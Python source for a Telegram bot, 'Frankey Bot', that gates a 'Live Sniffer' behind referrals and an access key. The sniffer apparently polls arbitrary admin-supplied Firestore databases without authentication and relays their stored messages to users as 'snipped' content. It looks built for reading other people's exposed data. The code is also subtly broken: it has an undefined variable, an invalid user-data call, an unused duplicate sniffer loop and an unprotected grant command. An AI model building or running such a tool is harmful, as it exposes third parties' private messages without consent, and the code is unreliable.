import json
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
import time
import uuid

# --- CONFIGURATION ---
with open('config.json', 'r') as f:
    config = json.load(f)

BOT_TOKEN = config['BOT_TOKEN']
ADMIN_ID = int(config['ADMIN_ID'])
CHANNEL_USERNAME = config['CHANNEL_USERNAME'].replace('@', '')
REF_REQ = config['REFERRAL_COUNT']
DEFAULT_KEY = config['DEFAULT_ACCESS_KEY']

# Helper to make HTTP requests to Firestore REST API
def fire_request(method, path, data=None):
    """
    Sends request to Firestore REST API.
    Assumes the base URL is stored in 'settings' collection under 'current_firebase' document field 'base_url'.
    Example Base URL: https://firestore.googleapis.com/v1/projects/YOUR_PROJECT/databases/(default)/documents
    """
    # Fetch current firebase config from our own bot's local storage or a central DB? 
    # Since we are using multiple URLs, let's store the active URL in a small local JSON file on render or just pass it via command.
    # Better approach: Store the active URL in a global variable or a simple text file on disk if needed.
    # But for simplicity, let's assume the Admin sets the URL and we save it to a file 'active_fb_config.json'
    
    try:
        with open('active_fb_config.json', 'r') as f:
            fb_config = json.load(f)
    except FileNotFoundError:
        return None, "No Active Firebase URL configured by Admin."

    base_url = fb_config.get('base_url')
    if not base_url:
        return None, "Base URL missing."

    url = f"{base_url}/{path}"
    
    headers = {'Content-Type': 'application/json'}
    
    if method == 'GET':
        response = requests.get(url, headers=headers)
        return response.json() if response.status_code == 200 else None, response.text
    
    elif method == 'POST':
        response = requests.post(url, headers=headers, json=data)
        return response.json() if response.status_code in [200, 201] else None, response.text
        
    elif method == 'PATCH':
        response = requests.patch(url, headers=headers, json=data)
        return response.json() if response.status_code == 200 else None, response.text

    return None, "Unknown Method"

# --- BOT HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    # 1. Check Channel Join
    try:
        member = await context.bot.get_chat_member(f"@{CHANNEL_USERNAME}", user.id)
        if member.status not in ['member', 'administrator', 'creator']:
            keyboard = [[InlineKeyboardButton("🔗 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}")]]
            await update.message.reply_text(
                "⚠️ You must join our channel to use this bot.",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return
    except Exception:
        pass 

    # 2. Check User Data (Local DB since we don't have a central DB yet, or use Firebase for users too?)
    # Let's store user data locally on Render first, then sync if needed. 
    # For now, let's keep user data in a simple JSON file 'users_db.json'
    
    user_data = get_local_user_data(user.id)
    
    if not user_data:
        # New User Setup
        new_user = {
            'id': user.id,
            'username': user.username,
            'referrals': [],
            'has_access': False,
            'key_used': None,
            'joined_at': time.time(),
            'device_id': f"FRN-{user.id}-DEV-{str(uuid.uuid4())[:6]}"
        }
        save_local_user_data(new_user)
        await send_main_menu(update, has_access=False)
    else:
        if user_data.get('has_access'):
            await send_main_menu(update, has_access=True)
        else:
            await send_main_menu(update, has_access=False)

def get_local_user_data(user_id):
    try:
        with open('users_db.json', 'r') as f:
            db = json.load(f)
            return db.get(str(user_id))
    except:
        return None

def save_local_user_data(user_data):
    db = {}
    try:
        with open('users_db.json', 'r') as f:
            db = json.load(f)
    except:
        pass
    
    db[str(user_data['id'])] = user_data
    with open('users_db.json', 'w') as f:
        json.dump(db, f, indent=4)

def set_user_field(user_id, field, value):
    user_data = get_local_user_data(user_id)
    if user_data:
        user_data[field] = value
        save_local_user_data(user_data)

# --- UI FUNCTIONS ---

async def send_main_menu(update, has_access):
    user = update.effective_user
    text = f"👋 <b>Welcome to Frankey Bot</b>\n\n"
    
    if has_access:
        text += "✅ <b>Access Granted</b>\n"
        text += "Use buttons below to interact.\n"
    else:
        text += "🔒 <b>Access Required</b>\n\n"
        text += "Option 1: Use an Access Key.\n"
        text += "Option 2: Refer 5 friends & they must join the channel.\n"

    keyboard = []
    
    if has_access:
        keyboard.append([
            InlineKeyboardButton("📱 My Device ID", callback_data='show_device'),
            InlineKeyboardButton("🔍 Live Sniffer", callback_data='start_sniff')
        ])
        # Optional Admin Link if you have one
        # keyboard.append([InlineKeyboardButton("🛠 Admin Panel", url="https://your-admin-panel-link.com")])
    else:
        keyboard.append([
            InlineKeyboardButton("🔑 Enter Access Key", callback_data='enter_key')
        ])
        keyboard.append([
            InlineKeyboardButton("👥 Referral Status", callback_data='check_ref')
        ])

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user_data = get_local_user_data(user_id)
    
    if not user_data:
        await query.edit_message_text("User data error. Please /start again.")
        return

    if query.data == 'show_device':
        did = user_data.get('device_id', 'N/A')
        await query.edit_message_text(f"📱 Your Device ID:\n\n<code>{did}</code>", parse_mode="HTML")
        
    elif query.data == 'check_ref':
        refs = len(user_data.get('referrals', []))
        needed = REF_REQ - refs
        if refs >= REF_REQ:
            msg = f"✅ You have enough referrals ({refs}/{REF_REQ})!"
        else:
            msg = f"❌ You need {needed} more referral(s).\nCurrent: {refs}/{REF_REF}"
        await query.edit_message_text(msg)

    elif query.data == 'enter_key':
        await query.edit_message_text("Please send your Access Key now.")
        # We will capture the next message in a temporary state or use /key command
        # Let's use /key command for simplicity
        await context.user_data.set('waiting_for_key', True)

    elif query.data == 'start_sniff':
        # Start the sniffer job
        context.job_queue.run_repeating(sniff_loop, interval=5, first=0, chat_id=query.message.chat_id)
        await query.edit_message_text("🔍 Starting Live Sniffer...")

async def cmd_key(update, context):
    args = context.args
    if args:
        key = args[0]
        if key == DEFAULT_KEY:
            set_user_field(update.effective_user.id, 'has_access', True)
            await update.message.reply_text("✅ Access Granted! Welcome to Frankey.")
            await start(update, None)
        else:
            await update.message.reply_text("❌ Invalid Key.")
    else:
        await update.message.reply_text("Usage: /key YOUR_ACCESS_KEY")

async def cmd_add_fb(update, context):
    # Only Admin
    if update.effective_user.id != ADMIN_ID:
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /addfb <BASE_URL>")
        return
        
    base_url = args[0]
    
    # Save to local file on Render
    with open('active_fb_config.json', 'w') as f:
        json.dump({'base_url': base_url}, f)
    
    await update.message.reply_text(f"✅ Firebase URL updated to: {base_url}\nBot will now use this URL for Sniffing.")

async def cmd_grant_access(update, context):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /grant <USER_ID> <DAYS>")
        return
    
    target_id = int(args[0])
    days = int(args[1])
    
    # Grant access locally
    user_data = get_local_user_data(target_id)
    if user_data:
        user_data['has_access'] = True
        save_local_user_data(user_data)
        await update.message.reply_text(f"✅ Access granted to {target_id} for {days} days.")
    else:
        await update.message.reply_text(f"User {target_id} not found in local DB.")

async def sniff_loop(context: ContextTypes.JobQueue):
    job = context.job
    chat_id = job.chat_id
    
    result, error = fire_request('GET', '') # Get root or specific collection path?
    # Usually, we need to know which collection. Let's assume 'messages' collection.
    # But since admin provides the BASE URL, he might need to specify the path in a separate command.
    # For now, let's assume the base URL points to the project root and we fetch a known collection.
    
    # Better: Admin sets URL + Collection Path via /setcollection
    # For this demo, let's assume the base URL ends with .../documents/ and we append 'messages'
    
    fb_config_result, fb_error = fire_request('GET', '') 
    # If the base URL is correct, this should return something or error out with valid structure.
    
    # Let's try to fetch from a default collection 'logs' or 'snippets'
    # The admin should provide a URL like: https://firestore.googleapis.com/v1/projects/my-proj/databases/(default)/documents
    # Then we append 'messages' to get all messages.
    
    # Simplified: Admin sets URL to include the collection name already? 
    # No, let's keep it simple. Admin sets Base URL. Bot appends 'messages' collection.
    
    path = 'messages' # Default collection name
    result, error = fire_request('GET', path)
    
    if result and isinstance(result, dict) and 'documents' in result:
        docs = result.get('documents', [])
        if docs:
            latest_doc = docs[-1]
            fields = latest_doc.get('fields', {})
            # Assuming there is a 'message' field
            msg_content = fields.get('message', {}).get('stringValue', str(fields))
            await context.bot.send_message(chat_id, f"🔴 <b>NEW MESSAGE SNIPPED:</b>\n\n<code>{msg_content}</code>", parse_mode="HTML")
    else:
        # Debug mode for admin
        # print(error)
        pass

async def cmd_start_referral(update, context):
    # Handle deep linking like t.me/bot?start=ref123
    args = context.args
    if args:
        referrer_id = args[0]
        new_user_id = update.effective_user.id
        
        ref_data = get_local_user_data(referrer_id)
        if ref_data:
            refs = ref_data.get('referrals', [])
            if new_user_id not in refs:
                refs.append(new_user_id)
                # Update local DB
                ref_data['referrals'] = refs
                save_local_user_data(ref_data)
                
                if len(refs) >= REF_REQ:
                    ref_data['has_access'] = True
                    save_local_user_data(ref_data)
                    try:
                        await context.bot.send_message(referrer_id, "🎉 Referrals complete! Access granted.")
                    except:
                        pass

async def cmd_set_collection(update, context):
    # Allow admin to set which collection to sniff
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /setcollection <COLLECTION_NAME>")
        return
    
    # We can store this in a config file too
    with open('collection_name.txt', 'w') as f:
        f.write(args[0])
        
    await update.message.reply_text(f"✅ Sniffer will now monitor collection: {args[0]}")

def load_collection_name():
    try:
        with open('collection_name.txt', 'r') as f:
            return f.read().strip()
    except:
        return 'messages'

# Override sniff_loop to use dynamic collection
async def sniff_loop_dynamic(context: ContextTypes.JobQueue):
    job = context.job
    chat_id = job.chat_id
    
    coll_name = load_collection_name()
    path = coll_name
    
    result, error = fire_request('GET', path)
    
    if result and isinstance(result, dict) and 'documents' in result:
        docs = result.get('documents', [])
        if docs:
            latest_doc = docs[-1]
            fields = latest_doc.get('fields', {})
            # Try to find any string field that looks like a message
            msg_content = ""
            for key, val in fields.items():
                if 'stringValue' in val:
                    msg_content = val['stringValue']
                    break
            
            if msg_content:
                await context.bot.send_message(chat_id, f"🔴 <b>NEW MESSAGE SNIPPED:</b>\n\n<code>{msg_content}</code>", parse_mode="HTML")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", lambda u, c: handle_start_logic(u, c)))
    app.add_handler(CommandHandler("key", cmd_key))
    app.add_handler(CommandHandler("addfb", cmd_add_fb))
    app.add_handler(CommandHandler("grant", cmd_grant_access))
    app.add_handler(CommandHandler("setcollection", cmd_set_collection))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(handle_callback))

    app.run_polling()

async def handle_start_logic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if args:
        referrer_id = args[0]
        # Check if referrer qualifies
        ref_data = get_local_user_data(referrer_id)
        if ref_data and len(ref_data.get('referrals', [])) >= REF_REQ:
            if not ref_data.get('has_access'):
                ref_data['has_access'] = True
                save_local_user_data(ref_data)
                try:
                    await context.bot.send_message(referrer_id, "🎉 Referrals complete! Access granted.")
                except:
                    pass
    
    await start(update, context)

if __name__ == '__main__':
    main()